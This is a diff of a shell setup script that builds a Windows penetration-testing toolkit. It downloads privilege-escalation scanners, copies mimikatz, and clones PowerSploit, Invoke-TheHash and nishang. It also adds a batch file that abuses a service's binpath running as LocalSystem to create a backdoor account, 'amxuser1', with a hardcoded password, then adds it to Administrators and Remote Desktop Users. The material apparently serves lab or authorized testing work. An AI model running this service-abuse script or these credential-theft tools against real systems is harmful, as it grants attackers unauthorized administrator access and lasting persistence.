@@ -1,7 +1,15 @@
 mkdir -p scripts_windows
 cd scripts_windows
+  wget -Nq https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASbat/winPEAS.bat
+  wget -Nq https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
+  mv winPEAS.exe winPEAS-64.exe
+  wget -Nq https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/x86/Release/winPEAS.exe
+  mv winPEAS.exe winPEAS-86.exe
 
-  wget -Nq https://raw.githubusercontent.com/GDSSecurity/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
+
+  cp ../tools_windows/mimikatz/Win32/mimikatz.exe mimikatz.exe 
+  cp ../tools_windows/mimikatz/Win32/mimilove.exe mimilove.exe 
+  cp ../tools_windows/mimikatz/Win64/mimikatz.exe mimikatz64.exe 
 
   # TODO BUILD Watson
   #wget https://github.com/rasta-mouse/Watson/releases/download/2.0/Watson_Net35.exe
@@ -62,25 +70,42 @@ cd scripts_windows
 
   wget -Nq https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe
 
-cd -
-
-mkdir -p scripts_windows/ps
-cd scripts_windows/ps
+  if [ ! -d sysi ]; then
+    wget https://download.sysinternals.com/files/SysinternalsSuite.zip
+    unzip SysinternalsSuite.zip -d sysi
+    rm SysinternalsSuite.zip
+  fi
 
   wget -Nq https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
-  wget -Nq https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 
-  wget -Nq https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-SMBClient.ps1
-  wget -Nq https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-SMBEnum.ps1
-  wget -Nq https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-SMBExec.ps1
-  wget -Nq https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-TheHash.ps1
-  wget -Nq https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-TheHash.psd1
-  wget -Nq https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-TheHash.psm1
-  wget -Nq https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-WMIExec.ps1
-
-  wget -Nq https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1
+  git clone https://github.com/PowerShellMafia/PowerSploit.git
+  git clone https://github.com/Kevin-Robertson/Invoke-TheHash.git
+  git clone https://github.com/samratashok/nishang.git
 
 cd -
+
+cat <<\EOT >scripts_windows/service_abuse_create_user.bat
+  sc config WebDriveService binpath= "net user /add amxuser1 amxpass1234"
+  sc config WebDriveService obj= ".\LocalSystem" password= ""
+  sc qc WebDriveService
+  net stop WebDriveService
+  net start WebDriveService
+  net start WebDriveService
+
+  sc config WebDriveService binpath= "net localgroup administrators amxuser1 /add"
+  sc config WebDriveService obj= ".\LocalSystem" password= ""
+  sc qc WebDriveService
+  net stop WebDriveService
+  net start WebDriveService
+  net start WebDriveService
+
+  sc config WebDriveService binpath= "net localgroup \"Remote Desktop Users\" amxuser1 /add"
+  sc config WebDriveService obj= ".\LocalSystem" password= ""
+  sc qc WebDriveService
+  net stop WebDriveService
+  net start WebDriveService
+  net start WebDriveService
+EOT
 
 rm -rf scripts_windows/bin
 mkdir -p scripts_windows/bin
